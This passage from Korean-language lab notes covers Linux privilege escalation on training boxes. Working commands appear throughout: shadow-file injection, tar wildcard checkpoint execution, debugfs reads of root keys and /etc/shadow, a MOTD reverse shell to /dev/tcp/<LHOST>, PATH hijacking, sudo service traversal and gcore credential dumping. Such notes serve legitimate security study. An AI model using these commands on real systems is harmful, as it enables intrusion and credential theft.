[[Graph]] 실측 — `sudo /usr/local/bin/pass-gen "$PAY"` 가 jane 행의 5번째 필드(0-index 4, shadow 포맷상 `max`)에 인자를 그대로 꽂음. 인자를 이렇게 구성:
```text
99999:7:::
josh:$6$Gr4phSlt$PGF3.RO7QU80esZUwsLy5nnnB3a.Jq4Qp7wW0bWUJS.Wpg09a4.F0gbi5qIBj4LLi2cFgRPsfHkEkGm25F3/Z1:19000:0:99999
```
`jane:<해시>:19831:0:` + 위 문자열 + `:7:::` 이 조립돼 **두 행으로 끊김.** 뒤쪽이 완전한 josh 행이 되고, 박스 원본의 josh 행 3개보다 **앞**에 놓임 = 인증에서 이김.

**심을 해시는 직접 만들 것** — 덤프한 해시를 재사용하는 것이 아니라 자기가 아는 평문의 sha512crypt 를 만들어 심음. [[Graph]] 는 salt `Gr4phSlt` 로 만든 것이라 무작위 salt 와 구별됨(덤프의 josh 해시 `$6$g744Ii0AvY$…` 와 값이 다른 것이 그 증거).

**소스를 못 봐도 부작용으로 인과를 세울 수 있음** — 이 박스의 대상은 스크립트가 아니라 **커스텀 바이너리**라 구현을 못 봄. 대신 그 «결과»가 `/etc/shadow` 에 남아 메커니즘이 사후 복원됨. **셸 하나를 잡았다고 끝이 아니라 그 계정에 허용된 sudo 항목의 «동작»까지 봐야 함.**

⚠️ 개행 페이로드는 전송 중 이스케이프가 먹혀 조용히 실패하기 쉬움(B-84). 그리고 **이 도구가 내 계정 비밀번호까지 갈아치울 수 있음**(A-47).

#### B-38. `sudo -l` 규칙 끝의 `*` 읽는 법 — 그리고 `tar` 체크포인트

**규칙 끝에 `*` 가 있으면 「그 프로그램의 모든 옵션이 열려 있다」고 읽을 것** — GTFOBins 의 해당 프로그램 `sudo` 항목이 요구하는 옵션을 그대로 붙이면 대개 끝남. `*` 가 **없고** 인자가 고정이면 그때 파일명 트릭(글로브 확장 이용)이 필요한 우회임.
근거 — `sudoers(5)` Wildcards 절: **명령행 인자 자리의 `*` 는 슬래시·공백을 포함해 매칭**됨(경로명 매칭과 다름).

**`tar` 의 경우** — `--checkpoint=N` + `--checkpoint-action=exec=CMD` 로 체크포인트 시점에 임의 명령 실행. **root 로 도는 tar 안에서 실행되므로 CMD 도 root**.
```bash
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh privesc.sh'
```
`--` 로 touch 자신에게 「이후는 파일명」이라 알려야 그 이름의 파일이 만들어짐.

**성공 판정** — 아카이브 멤버 목록에 **페이로드 스크립트는 있는데 `--checkpoint=*` 파일명이 없으면**(옵션으로 소비된 것) 성공임.

⚠️ **페이로드에 `>` 로 시스템 파일을 덮어쓰지 말 것** — 그 sudo 규칙 자체를 지워 유일한 통로를 닫음(A-4-11).

**출처** — [[Cockpit]](`james ALL=(root) NOPASSWD: /usr/bin/tar …*`). 원리가 같은 자매 사례는 [[Zipper]] 의 root 크론 `7za a … *.zip` — **글로브가 인자 자리에 들어가면 파일명이 곧 옵션**임(B-35 도 같은 뿌리). 도구별 벡터 전량은 B-39.

#### B-39. 와일드카드 인젝션 — 도구별 벡터

**성립 조건 3가지 동시** — ①고권한 실행(root 크론·`sudo`) ②명령에 글로브(`*`) ③그 글로브가 가리키는 디렉터리에 **쓰기 가능**.

**메커니즘** — 셸이 글로브를 확장하되 **인용부호를 붙여주지 않음.** 파일명이 곧 argv 원소가 되므로 `-`·`@` 로 시작하는 파일명을 만들면 그 자리에서 **옵션·지시자로 파싱**됨.

| 도구 | 만들 파일명 | 효과 |
|---|---|---|
| `7z`·`7za`·`7zr` | `@파일명` | **리스트파일로 읽음.** 심볼릭 링크와 결합하면 임의 파일 읽기(에러 메시지로 유출) |
| | `-i@파일` · `-x@파일` | include/exclude 리스트파일 |
| `tar`(GNU) | `--checkpoint=1` + `--checkpoint-action=exec=sh x.sh` | 아카이빙 중 임의 명령 실행(B-38) |
| | `--to-command=sh x.sh` | 추출 시 명령 실행 |
| `rsync` | `-e sh x.sh` | 원격 셸 지정 옵션으로 명령 실행 |
| `chown`·`chmod` | `--reference=<내 소유 파일>` | 소유자·권한을 **참조 파일 → 대상**에 복사 |
| `zip` | `-T` · `-TT` · `sh x.sh #`(별도 argv, `#` 필수) | 무결성 테스트 명령으로 실행 |

⚠️ **`chown --reference=A B` 는 A 의 소유권을 «읽어» B 에 «쓴다».** 참조로 지정할 것은 **내가 소유한 파일**임 — `--reference=/etc/shadow` 는 방향이 반대라 아무것도 못 얻음.

**`7za` 의 `@리스트파일` 메커니즘** — `*.zip` 확장 시 `@enox.zip` 이라는 이름의 파일이 끼면 `7za` 가 그 «내용»을 「압축할 파일 이름 목록」으로 해석함. 없는 파일이면 `<내용> : No more files` **경고를 출력** — 그 출력이 저권한이 읽을 수 있는 로그로 가면 **임의 파일 유출 채널**이 됨(심볼릭 링크로 `/root/secret` 등을 가리킴).

**발상의 핵심은 «내가 읽는 것이 아니라 root 에게 읽히게 만드는 것»임.** 고권한 프로세스의 **에러 메시지·로그·백업 산출물**이 저권한에게 읽히면 그것이 유출 채널임. 7z 말고도 계속 재사용되는 발상임.

**발화하지 않으면 순서대로 의심:**
- 파일명이 **글로브 패턴에 매칭되지 않음**(`@secret` vs `*.zip`)
- **디렉터리가 다름** — 스크립트의 `cd` 줄을 다시 읽을 것
- **`--` 를 안 붙여 `touch` 가 옵션으로 먹음** → `touch -- '--checkpoint=1'`
- **크론 1주기를 안 기다림**(B-31)
- `sudo` 로 직접 실행하는 경우라면 **현재 디렉터리가 `sudo` 실행 시점의 cwd** 임

**곁들여 볼 둘:**
- **비밀번호를 명령행 인자로 넘기는 스크립트는 `ps` 로 샘**(`7za … -p$password`). `/proc/*/cmdline` 루프나 `pspy` 로 잡을 것 — **크론 대기 중에 병행하면 공짜임**
- **`ls` 가 아니라 `ls -al`.** [[Zipper]] 의 결정적 단서 `enox.zip -> /root/secret` 는 `-l` 없이는 보이지 않음. 심볼릭 링크·숨김 파일·날짜가 전부 거기 있음

**출처** — [[Zipper]](root 크론 `7za a … *.zip` + `@enox.zip` 리스트파일 + `enox.zip -> /root/secret` 심볼릭 링크 → `backup.log` 에 비밀번호 유출) · [[Cockpit]](`sudo tar -czvf … *`, 같은 계열의 tar 판).

#### B-3-10. `disk` 그룹 = root, 그리고 `debugfs` 사용법

**`disk` 그룹은 블록 디바이스(`/dev/sda*`)를 직접 읽을 권한을 줌.** 파일시스템 권한(`/root` 0700)은 **커널이 «경로»를 통해 접근할 때만** 적용되므로, 디바이스를 직접 읽으면 우회됨.

```text
[경로로 접근]  open("/root/.ssh/id_rsa")
                 └→ VFS → 권한 검사(0700, uid 0) → ext4 드라이버 → 블록 장치 → 디스크
                              ↑ 여기서 EACCES
[디바이스로 접근]  open("/dev/sda2")
                 └→ VFS → 권한 검사(0660 root:disk, 나는 disk 그룹) → ✅ 통과 → 원본 바이트
                              ↑ 여기만 통과하면 그 뒤에 「파일 권한」이라는 개념이 없다
```

**같은 논리가 이 그룹들에 전부 적용됨:**

| 그룹 | 무엇을 직접 만지는가 | 결과 |
|---|---|---|
| `disk` | 블록 디바이스 | 전체 파일시스템 읽기·쓰기 = **root** |
| `docker` | 도커 소켓 | 호스트 `/` 를 마운트한 컨테이너 실행 = root |
| `lxd` | LXD 소켓 | 위와 동일(A-41 의 [[Fikklish]] 사례) |
| `shadow` | `/etc/shadow` | 해시 획득 → 크랙 |
| `adm` | `/var/log` | 로그 안의 자격증명 |
| `video` | 프레임버퍼 | 화면 캡처 |

→ **`id` 출력의 보조 그룹은 한 줄씩 소리내어 읽을 것**(A-41 · C-2). [[Fanatastic]] 은 셸을 잡고 친 **첫 명령 `id`** 에서 `groups=1001(sysadmin),6(disk)` 가 나와 나머지 열거가 불필요했음 — SUID 탐색부터 했으면 수십 줄 출력 안에서 답을 찾느라 시간을 썼을 것.

**`debugfs`(e2fsprogs)는 마운트를 거치지 않고 ext2/3/4 구조를 직접 파싱하는 도구** — 커널 VFS 를 전혀 거치지 않음. `disk` 그룹의 「원본 바이트 읽기」 능력을 **사람이 쓸 수 있는 파일 인터페이스로 번역**함:
```text
disk 그룹  →  /dev/sda2 의 원본 바이트   (읽을 수는 있으나 해석 불가)
              +
debugfs    →  ext4 구조 파싱            (해석해서 파일로 보여줌)
              =  /root 안의 무엇이든 읽기
```

⚠️ **디바이스 이름을 넘겨짚지 말 것.** [[Fanatastic]] 의 루트 파티션은 다른 writeup 이 적은 `/dev/sda1` 이 아니라 **`/dev/sda2`** 였음. `df -h /` **한 줄**이면 끝남(`lsblk`·`cat /proc/partitions`·`ls -l /dev/sd*` 도 같이).
→ **UEFI 시스템의 `sda1` 은 대개 FAT32 EFI 파티션이라 ext4 가 아니고 `debugfs` 가 열지 못함** — 그 실패를 보고 「disk 그룹으로는 안 되나 보다」로 **옳은 길을 스스로 폐기하는 것**이 가장 비싼 오류임.
→ 일반화: **writeup 에서 가져올 것은 «절차»이지 «상수»가 아님.** IP·포트·경로·디바이스 이름·사용자명은 환경마다 다른 변수임.

| 플래그 | 의미 | 위험도 |
|---|---|---|
| `-R "cmd"` | 명령 하나 실행 후 종료 | 안전. **기본으로 쓸 것** |
| (없음) | 대화형 셸 | 안전하나 자동화 불가 |
| `-w` | 쓰기 가능하게 열기 | ⚠️ **마운트된 fs 에 쓰면 커널 캐시와 불일치 → 파일시스템 손상·데이터 유실** |

마운트된 파일시스템은 커널이 페이지 캐시를 들고 있음. 그 밑에서 `debugfs -w` 로 디스크를 고치면 커널은 모르고, 나중에 캐시를 플러시하며 수정을 덮어쓰거나 메타데이터를 깨뜨림. **시험에서 타겟 파일시스템을 깨면 리버트 말고는 답이 없음 — 읽기로 끝낼 수 있으면 절대 쓰지 말 것.**

**`debugfs` 의 `ls -l` 은 셸 `ls` 와 형식이 다름** — 열 순서가 inode 번호·모드(8진)·링크수·uid·gid·크기·시각·이름임. **크기 비교로 관계를 추론하는 것이 핵심 기술**임(예: `authorized_keys` 와 `id_rsa.pub` 크기가 같으면 자기 공개키가 등록돼 있을 가능성이 높음).

**개인키를 얻으면** `chmod 600` → `ssh-keygen -y -f` → 접속. OpenSSH 는 개인키가 그룹·타인에게 읽히면 **무시하고 거부함.** `ssh-keygen -y -f` 는 키 무결성과 패스프레이즈 여부를 접속 «전»에 확인해 줌.
⚠️ `debugfs -R "cat …" <dev> > <출력경로>` 를 칠 때 **리다이렉트 대상이 어디인지 확인할 것** — 타겟 경로로 쓰면 타겟 파일시스템에 파일이 생김(「남긴 흔적」, C-5).

**대안 경로 비교(하나가 막혔을 때):**

| 방법 | 명령 | 평가 |
|---|---|---|
| 개인키 탈취 | `debugfs -R "cat /root/.ssh/id_rsa" <dev>` | **최선.** 안정적 root 셸, 재부팅 후에도 재현 가능 |
| 플래그만 직접 읽기 | `debugfs -R "cat /root/proof.txt" <dev>` | 가장 빠르나 셸이 아니라 파일 하나뿐 — **시험 증거 요건을 못 채울 수 있음**(C-3 · E 절) |
| `/etc/shadow` 읽고 크랙 | `debugfs -R "cat /etc/shadow" <dev>` | 해시를 얻어도 크랙은 확률 게임(B-63) |
| 원본 디바이스 grep | `grep -a -m1 -C2 'BEGIN OPENSSH' <dev>` | 구조를 몰라도 되나 전체를 훑어야 하고 **삭제 데이터 잔해도 섞임** |
| `authorized_keys` 에 내 키 추가 | `debugfs -w -R "..."` | ⚠️ 쓰기 모드 필요 → 손상 위험. **읽기로 목적 달성이 되면 하지 말 것** |
| 디스크 이미지 통째 복사 | `dd if=<dev> of=…` | 대용량 전송. 랩에서는 시간 낭비, 실전에서는 탐지 신호 |

**우선순위 규칙 — 읽기로 끝나는 방법 > 쓰기가 필요한 방법, 셸을 주는 방법 > 파일 하나를 주는 방법.**

**출처** — [[Fanatastic]](`sysadmin` 이 `disk` 그룹, `/dev/sda2` + `debugfs` → root 개인키).

#### B-3-11. MOTD 권한상승 — `/etc/update-motd.d/` 는 SSH 로그인마다 root 로 돈다

**판단 신호** — Ubuntu · SSH 로그인 가능 · sudo/SUID/cron 이 전부 빔(A-41).
```bash
ls -la /etc/update-motd.d/
grep -r . /etc/update-motd.d/
```
**스크립트 자체가 root 소유(755)여도 그것이 «부르는 대상»이 쓰기 가능하면 끝임.** `grep -r` 로 외부 경로 호출을 한 번에 훑는 것이 빠름.

[[Fowsniff]] — `00-header`(root:root 755)가 원본 Canonical 스크립트의 `printf` 줄을 주석 처리하고 맨 아래에 `sh /opt/cube/cube.sh` 를 추가해 뒀음. 그 `cube.sh` 는 `-rw-rwxr-- parede:users`(모드 674) — 소유자는 실행조차 못 하는데 그룹 `users` 는 `rwx` 인, 손으로 잘못 준 권한의 전형.

**⚠️ 실행 주체는 릴리스마다 다름 — 「pam_motd 가 돌린다」고 외우지 말 것.** [[Fowsniff]] 의 PAM 은 `pam_motd.so noupdate` 라 update-motd.d 를 **실행하지 않았고** `sshd_config` 는 `PrintMotd no` 였음. 실제 실행 주체는 **sshd 특권 프로세스**였음(Ubuntu 가 OpenSSH 에 넣은 패치. `PrintMotd no` 여도 생성은 돌고 출력만 pam_motd 가 함).

**「왜 root 로 도는가」는 추측하지 말고 `/proc` 으로 증명할 것.** 스크립트 안에 프로브를 심어 자기 자신의 조상을 거슬러 올라감 — `/proc/<pid>/stat` 의 **4번째 필드가 ppid**, `/proc/<pid>/cmdline` 이 명령 전문. 이 두 줄이면 어떤 실행 경로든 뿌리까지 감:
```text
sh/opt/cube/cube.sh [pid 1882]
/bin/sh/etc/update-motd.d/00-header [pid 1881]
run-parts--lsbsysinit/etc/update-motd.d [pid 1880]
sh-c/usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin
:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new [pid 187
9]
sshd: baksteen [priv] [pid 1876]
/usr/sbin/sshd-D [pid 709]
```
— 출처: `~/PG/Fowsniff/enum4_motd_parent.log`

⚠️ **`cmdline` 은 NUL 구분임** — `tr -d '\0'` 으로 지우면 위처럼 인자가 명령에 붙어 나옴. **`tr '\0' ' '` 로 바꿀 것.**

**공격 — 덮어쓰지 말고 append 할 것.** 원본 아트 출력이 남아야 로그인 화면이 정상으로 보이고, 복원도 `truncate -s <원본크기>` 한 번이면 됨(C-5).
```bash
printf '\nbash -c "bash -i >& /dev/tcp/<LHOST>/443 0>&1" &\n' >> /opt/cube/cube.sh
```
- `bash -c "…"` 로 감싸는 이유 — 호출자가 `#!/bin/sh`(dash)임. dash 는 `>&` 를 **리다이렉션 파싱에서** 거부해 `/dev/tcp` 에 도달조차 못 함: `dash: 1: Syntax error: Bad fd number`(2026-08-26 Kali 재확인, exit 2). 「dash 가 `/dev/tcp` 를 모른다」가 아님(A-31)
- `&` 로 백그라운드에 던질 것. `[가정]` 안 붙이면 sshd 가 `> /run/motd.dynamic.new` 리다이렉션으로 `run-parts` 종료를 기다려 로그인이 멈출 것으로 보임 — [[Fowsniff]] 에서 실증하려던 순간 박스가 내려가 **실측하지 못했음**
- **아웃바운드가 막힌 경우 대안** — `cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash` 후 `/tmp/rootbash -p`(`-p` 없으면 euid 가 날아감, B-33)

**트리거가 시간이 아니라 «내 로그인»임** — 크론과 달리 대기가 없음. 그냥 SSH 로 다시 들어가면 됨(B-31 ⑶).

⚠️ **`/etc/profile.d/`·`~/.bashrc` 와 헷갈리지 말 것** — 그쪽은 **로그인하는 사용자 권한**으로 돌아 권한상승이 안 됨.

**변형** — `/etc/update-motd.d/` 자체가 그룹 쓰기 가능하거나, `00-header` 가 `/opt`·`/usr/local/bin` 아래 스크립트를 부르고 그 스크립트가 헐거운 형태. Ubuntu 박스에서 실제로 자주 나옴.

**출처** — [[Fowsniff]].

#### B-3-12. SUID 가 절대경로 없이 외부 명령을 부르면 PATH 하이재킹이 된다

**탐지 3초 반사** — SUID 바이너리를 만나면 `strings <바이너리>` 부터. `system`·`popen`·`execlp` 계열 심볼과 함께 **절대경로 없는 명령 문자열**(`cat`·`ls`·`cp` 등)이 보이면 그 즉시 후보임.

[[PwnLab]] `msgmike`(SUID mike):
```text
$ strings /home/kane/msgmike | grep -i cat
cat /home/mike/msg.txt
```
`system` 과 `setreuid` 가 심볼 목록에 함께 있고, 호출 문자열이 `cat` 을 **절대경로 없이** 부름.

**공격:**
```bash
mkdir -p /tmp/.pth
printf '#!/bin/bash\nexec /bin/bash -p\n' > /tmp/.pth/cat   # 반드시 «별도 줄»로 — 히스토리 확장 함정(A-3-12)
chmod +x /tmp/.pth/cat
PATH=/tmp/.pth:$PATH /home/kane/msgmike
```
실행 직후 프롬프트가 `kane@` → `mike@` 로 바뀌면 성공. 이 바이너리는 `setreuid` 를 먼저 호출해 **real uid 까지** mike 로 바뀌었음 — 일반적인 경우(`setreuid` 미호출)라면 euid 만 바뀌고 `sh` 경유 시 손실될 수 있음(B-33).

**무반응이면 순서대로 의심** — ①`chmod +x` 누락(가장 흔함, B-31 ⑵와 같음) ②셔뱅 누락 ③`/tmp` 가 `noexec`.

⚠️ **하이재킹으로 얻은 셸은 PATH 오염 상태임.** 다음 단계로 넘어가기 전에 표준 PATH 로 복원할 것 — 안 하면 다단계 체인에서 뒷단이 **조용히** 실패함(A-4-13, 같은 박스 사례).
⚠️ **PATH 하이재킹과 문자열 삽입은 배타적이지 않음** — 같은 박스의 `msg2root` 는 `/bin/echo` 절대경로라 하이재킹은 안 통했고 대신 무필터 커맨드 인젝션이 열려 있었음(B-32). **둘 다 볼 것.**

**출처** — [[PwnLab]](`msgmike`). 크론 판은 B-31 ⑵.

#### B-3-13. Go 정적 SUID 바이너리는 `strings` 가 아니라 «심볼»로 읽는다

**커스텀 SUID 바이너리를 만나면 `-h`·도움말을 믿지 말고 `nm`/`objdump` 로 확인할 것.**

1. **심볼 나열** — `nm <bin> | grep " T main\."`. Go 는 정적 링크라 `strings` 는 잡음이 많지만 심볼은 깨끗함. ⚠️ **Go 심볼은 대문자 `T`** — 소문자 `t` 로 grep 하면 빈손
2. **외부 명령 실행 여부** — `nm <bin> | grep -E " T os/exec\.(Command|LookPath)$"`
3. **호출 지점 디스어셈** — `objdump -d --start-address=<addr> --stop-address=<addr> <bin>`. 직전 `lea`/`mov` 로 인자 문자열 주소를 특정. ⚠️ **Go 문자열은 (포인터, 길이) 쌍으로 인코딩** — 그 오프셋을 파일 오프셋으로 환산해 읽으면 실제 실행 명령이 그대로 나옴
4. **이름에 `/` 가 없으면**(`exec.Command("iptables", …)`) `LookPath` 로 `$PATH` 를 뒤짐 → **PATH 하이재킹**(B-3-12)

**⛔ 도움말의 옵션이 그럴듯해도 실제 동작은 디스어셈으로 확인할 것.** [[PlanetExpress]] `relayd` 의 `-C [file]`(config 읽기)·`-P [file]`(pid 파일)은 임의 파일 읽기·쓰기처럼 보였으나 **둘 다 미끼**였음 — `-C` 는 JSON 파서 실패 사유만 찍고 내용은 안 보여주고, `-P` 는 `os.Stat` 한 번 부르고 로그만 찍을 뿐 파일을 만들지 않음.
**위장까지 들어 있었음** — `config.cpp:1539` 같은 **C++ 파일:행 표기**가 박혀 있지만 실제로는 Go 로 빌드됨(`/usr/lib/go-1.17/src/…` 경로가 문자열에 남음). `github.com/docker/docker/pkg/namesgenerator`·`github.com/google/uuid` 로 Synology DSM 흉내(`vigorous_haibt` alias, `-s` 의 serverID)를 냄.
→ **가짜 로그 문구·가짜 언어 지문에 속지 말 것.** 판정 근거는 빌드 경로 문자열과 심볼 테이블임(A-11 「배너가 정체를 뜻하지 않음」의 바이너리 판).

**심볼 목록 → `os/exec` 호출 지점 → 인자 문자열 순서로 15분이면 끝남.**

**출처** — [[PlanetExpress]](`relayd.bin` · `relayd.main.asm` · `enum_relayd.log` · `enum_relayd2.log`).

#### B-3-14. sudo `service` — 인자가 «경로에 이어붙는» 프로그램은 전부 탈출구다

**`sudo -l` 에 `(ALL) NOPASSWD: /usr/sbin/service` 가 보이면 그 자리에서 끝.**

`/usr/sbin/service` 는 컴파일된 바이너리가 아니라 **`#!/bin/sh` 셸 스크립트**임(Debian·Kali `init-system-helpers` 패키지). Kali 원문:
```sh
SERVICEDIR="/etc/init.d"

run_via_sysvinit() {
   if [ -x "${SERVICEDIR}/${SERVICE}" ]; then
      exec env -i LANG="$LANG" … PATH="$PATH" TERM="$TERM" "$SERVICEDIR/$SERVICE" ${ACTION} ${OPTIONS}
   else
      echo "${SERVICE}: unrecognized service" >&2
      exit 1
   fi
}
```

| 조각 | 의미 |
|---|---|
| `"$SERVICEDIR/$SERVICE"` | **인용은 돼 있음.** 공백·세미콜론으로 명령을 주입하는 건 안 됨. 뚫리는 것은 **경로 구분자 `/` 를 안 거른다는 점 하나** |
| `if [ -x … ]` 가드 | 실행 비트가 있는 파일만 통과. 통과 못 하면 `unrecognized service` — **이 메시지가 보이면 경로가 틀렸거나 대상이 실행 불가라는 뜻** |
| `exec env -i …` | 환경변수를 로케일·`PATH`·`TERM` 만 남기고 통째로 비움 |

⚠️ **`env -i` 는 `sudo` 의 `env_reset` 보다 한 겹 더 강함.** `sudo -l` 에 `env_reset` 이 안 보이더라도 `service` 를 경유하면 `LD_PRELOAD`·`LD_LIBRARY_PATH`·`IFS`·`BASH_ENV` 계열은 **두 겹으로 막혀** 여전히 안 통함. 남는 공격면이 「인자가 경로에 이어붙는다」 하나뿐이고 그것이 GTFOBins 에 오른 이유임.

| 입력 | 이어붙인 결과 | 실행되는 것 |
|---|---|---|
| `apache2` | `/etc/init.d/apache2` | 정상 동작 |
| `../../bin/bash` | `/etc/init.d/../../bin/bash` | **`/bin/bash`** |
| `../../../../../bin/bash` | `/etc/init.d/../../../../../bin/bash` | **`/bin/bash`**(동일) |

```bash
sudo /usr/sbin/service ../../../../../bin/bash
```
`..` 를 넉넉히 넣어도 되는 이유는 커널 경로 해석에서 `/..` 가 `/` 이기 때문임. 루트보다 위는 없으므로 초과분이 조용히 흡수됨 — **정확한 깊이를 셀 필요가 없음.** 디렉터리 트래버설(`../../../etc/passwd`)에서도 똑같이 쓰는 성질임(B-14).

**`sudo -l` 출력 읽는 법:**

| 줄 | 의미 |
|---|---|
| `(ALL) NOPASSWD: <프로그램>` | 모든 사용자로(root 포함) 비밀번호 없이 실행 가능 |
| `env_reset` | 환경변수 초기화 → `LD_PRELOAD`·`LD_LIBRARY_PATH` 봉쇄 |
| `secure_path=…` | `PATH` 고정 → PATH 하이재킹 봉쇄 |
| 인자 제한이 없음 | **인자를 자유롭게 줄 수 있다는 것이 취약점의 전부** |

`env_reset` 과 `secure_path` 가 보이면 환경변수 계열은 죽었다고 판단하고 **곧바로 GTFOBins 로 갈 것.**

**일반화 — `sudo -l` 에 걸린 프로그램이 아래 넷 중 하나라도 하면 거의 예외 없이 권한상승이 됨:** ① 인자를 경로에 이어붙임 ② 셸을 띄움 ③ 파일을 읽고 씀 ④ 외부 명령을 부름.
반사적으로 확인할 것 — `service` · `tar`(`--checkpoint-action=exec`, B-38) · `zip`(`-T -TT`) · `awk` · `find`(`-exec`) · `vim`·`less`·`man`(`!sh`) · `git`(`-p` 페이저) · `env` · `nmap`(구버전 `--interactive`) · `docker` · `systemctl`. GTFOBins(<https://gtfobins.github.io>)에서 프로그램명을 검색하는 데 10초면 됨 — **`sudo -l` 결과가 나오는 즉시 그렇게 할 것.**
⚠️ 인자가 «고정»돼 있으면 이 카드가 아니라 A-43(그 바이너리가 «읽는 데이터»를 공략)으로 감. 띄운 root 셸이 즉시 죽으면 A-4-16.

**출처** — [[Crane]](`www-data` → root). 같은 골격 — [[Cockpit]](`tar … *` 와일드카드, B-38 · B-39).

#### B-3-15. 코어 덤프에서 평문 자격증명 추출 — `sudo -l` 을 4가지 질문으로 판정하는 법

**「프로세스 메모리를 읽을 수 있다 = 그 프로세스의 모든 비밀을 읽을 수 있다.」** 리눅스의 `gcore`·`gdb -p`·`/proc/PID/mem` 과 Windows 의 `procdump`·LSASS 덤프가 **같은 사고**임.

**`sudo -l` 에 뭐가 나오든 이 순서로 판정할 것:**

| # | 질문 | 대표 바이너리 | 노릴 것 |
|---|---|---|---|
| 1 | 셸을 직접 주는가 | `vi`·`less`·`man`·`awk`·`find -exec`·`python`·`perl` | GTFOBins `sudo` 항목 그대로 |
| 2 | 파일을 «쓰는가» | `tee`·`dd`·`cp`·`tar`·`zip` | `/etc/passwd` · sudoers · `~root/.ssh/authorized_keys` · cron |
| 3 | 파일을 «읽는가» | `cat`·`head`·`strings`·**`gcore`**·`gdb`·`strace`·`tcpdump` | `/etc/shadow` · SSH 개인키 · **프로세스 메모리** |
| 4 | 다른 프로그램을 실행하는가 | `env`·`nice`·`timeout`·`systemctl`·`start-stop-daemon`·`git -c core.pager` | B-3-14 |

**`gcore` 는 3번임 — 「읽기만 되는 원시」도 root 로 가는 완전한 경로가 됨.**

[[Pelican]] 실측 — `(ALL) NOPASSWD: /usr/bin/gcore` 는 GTFOBins 에 항목이 없는 바이너리지만 질문 3에 정확히 해당함:
```bash
ps -ef --forest                          # 배포판에 없는 커스텀 root 프로세스를 특정
sudo gcore <PID>                         # 예: /usr/bin/password-store
strings core.<PID> | grep -A2 -B2 -i passw
```

**`gcore` 실무 함정 셋:**
1. **현재 디렉터리에 씀** — 쓰기 불가 디렉터리면 실패. `cd /tmp` 먼저
2. **덤프 크기** — JVM 같은 큰 프로세스는 수 GB 라 디스크가 참. **작은 커스텀 바이너리를 노릴 것**
3. **ptrace 제한**(`/proc/sys/kernel/yama/ptrace_scope`) — 일반 사용자는 막힐 수 있으나 **`sudo` 로 실행하면 이 제한을 넘음**

**`strings` 를 쓸 때:**
- ⚠️ **라벨과 값이 «다른 줄»에 있을 수 있음** — `strings` 는 널 종료 문자열 단위로 끊으므로 `001 Password:` 와 실제 값이 서로 다른 문자열 객체면 줄이 갈라짐. `grep passw` 단독이면 라벨만 잡히고 **「덤프에 패스워드가 없다」로 오판함.** `-A2 -B2` 로 앞뒤 문맥까지 볼 것
- 출력이 수천 줄이면 — `strings -n 12 core | grep -v '^[/.]'`(12자 이상, 경로 제외)
- **Windows 덤프는 `strings -e l`(UTF-16LE) 필수** — 기본 `strings` 로는 아예 안 잡힘

⚠️ 부수 — 코어 덤프에는 커널 문자열도 그대로 들어 있어 **`uname` 을 못 쳐도 커널이 확정됨**([[Pelican]] 의 `4.19.0-10-amd64`, A-1).

**출처** — [[Pelican]](`sudo gcore` → `password-store` 메모리 → root 평문).

#### B-3-16. getcap 결과에서 노이즈와 후보를 가른다 — GTFOBins 원문이 정확히 그 최대치다

A-41 의 「SUID·capability 는 «목록»이 아니라 «배포판 기본과 다른 것»을 보는 것」의 capability 판 실측임.

[[Levram]] — `linpeas.sh` 의 `Files with capabilities` 절이 뱉은 **6행 전량**(출처: `파일보관\Pasted image 20260629102405.png`):

| 보이는 것 | 판정 | 근거 |
|---|---|---|
| `/snap/core20/1518/usr/bin/ping` · `/snap/core20/1891/usr/bin/ping` · `/usr/bin/ping` — `cap_net_raw=ep` | 정상 | 현대 배포판이 `ping` SUID 를 대체한 표준 설정. snap 사본이 중복으로 세 줄을 차지함 |
| `/usr/bin/mtr-packet cap_net_raw=ep` | 정상 | mtr 백엔드 |
| `/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper` — `cap_net_bind_service,cap_net_admin=ep` | 정상 | GStreamer PTP 헬퍼, 패키지 기본값 |
| `/usr/bin/python3.10 cap_setuid=ep` | **비정상** | capability 가 네트워크 계열이 아니고 대상이 **인터프리터** |

**신호 대 잡음이 1:5 임** — 6행 중 5행이 버릴 것이고 그 5행은 어느 Ubuntu 에서나 같은 얼굴로 나옴. 목록을 스크롤하는 것이 아니라 **`cap_net_*` 를 먼저 지우고 남는 것을 보는** 순서로 읽을 것.
**외울 규칙 둘** — ⑴ `cap_net_*` 는 거의 항상 노이즈 ⑵ 대상이 인터프리터·아카이버·디버거(`python`·`perl`·`ruby`·`node`·`php`·`tar`·`rsync`·`gdb`·`openssl`·`vim`)면 **무조건 후보**.
`[가정]` 위 「정상」 판정의 근거(그 5행이 Ubuntu 22.04 패키지 기본값이라는 것)는 배포판 일반 지식임. 캡처가 확정하는 것은 **「이 호스트의 capability 보유 파일 전량이 저 6행」**까지임.

⛔ **GTFOBins 원문을 임의로 「보강」하면 실패함.** `cap_setuid` 항목은 `os.setuid(0)` 만 부름. 「더 완전한 root」를 기대해 `os.setgid(0)` 을 덧붙이면:
```text
PermissionError: [Errno 1] Operation not permitted
```
`setgid` 는 `CAP_SETGID` 를 요구하는데 부여된 것은 `cap_setuid` **하나뿐**임. **capability 는 정확히 부여된 것만 쓸 수 있고, GTFOBins 의 그 한 줄이 그 capability 의 정확한 최대치이지 축약이 아님.** 결과적으로 gid 는 원래 소유 그룹으로 남음(`uid=0 gid=1000(app)` 반쪽 root) — **원문 그대로 `setuid` 만 부르는 것이 정답임.**

`getcap` 이 미설치(`libcap2-bin` 부재)면 `find / -exec getcap {} \;` 도 실패함 — 없는 명령을 수만 번 호출할 뿐임. 대안은 linpeas 업로드, 또는 확장속성 직접 조회:
```bash
for f in $(find / -type f -perm -u+x 2>/dev/null); do getfattr -n security.capability "$f" 2>/dev/null; done
```

#### B-3-17. `/etc/passwd` 에 심을 crypt 해시 만들기 — `openssl passwd` 가 가장 안전한 선택

```text
$1$rdv9F6o9$IfCFDDxwb6oW7J9A.5qdI0
 │  │        └─ 해시 본문
 │  └─ salt (8자, 매번 랜덤)
 └─ 알고리즘 ID
```

| ID | 알고리즘 | 비고 |
|---|---|---|
| (없음) | 전통 DES crypt | 8자까지만 유효. 쓰지 말 것 |
| `$1$` | MD5-crypt | **`openssl passwd` 의 기본값.** glibc 전부 지원 — 호환성 최고 |
| `$5$` | SHA-256-crypt | `openssl passwd -5` |
